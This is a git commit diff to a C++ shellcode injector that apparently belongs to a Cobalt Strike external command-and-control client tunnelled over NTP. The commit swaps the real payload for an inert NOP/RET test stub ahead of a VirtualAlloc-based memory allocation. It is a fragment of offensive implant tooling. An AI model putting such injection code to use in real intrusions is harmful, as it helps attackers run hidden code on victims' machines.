a2e049fe88a0d8e7ef88c03b65316013d8c591a8
Ryan Kleffman <91687869+ryanq47@users.noreply.github.com>
2025-09-23 21:38:08 -0700

    Update injector.cpp

--- client/CS-EXTC2-NTP/injector.cpp
+++ client/CS-EXTC2-NTP/injector.cpp
@@ -11,8 +11,13 @@ int injector(std::vector<uint8_t> payloadVector) {
     HANDLE th;
     DWORD oldprotect = 0;
 
-    unsigned char* payload = payloadVector.data();
-    unsigned int payload_len = payloadVector.size();
+    //this works - so somethings up with the vector access w/ memory
+    std::cout << "[?] Using temp payload of \\x90\\x90\\x90\\xC3 cuz the payload is being dumb" << std::endl;
+    const char* payload = "\x90\x90\x90\xC3";
+    unsigned int payload_len = 4;
+
+ /*   unsigned char* payload = payloadVector.data();
+    unsigned int payload_len = payloadVector.size();*/
 
     exec_mem = VirtualAlloc(0, payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
     if (exec_mem == nullptr) {
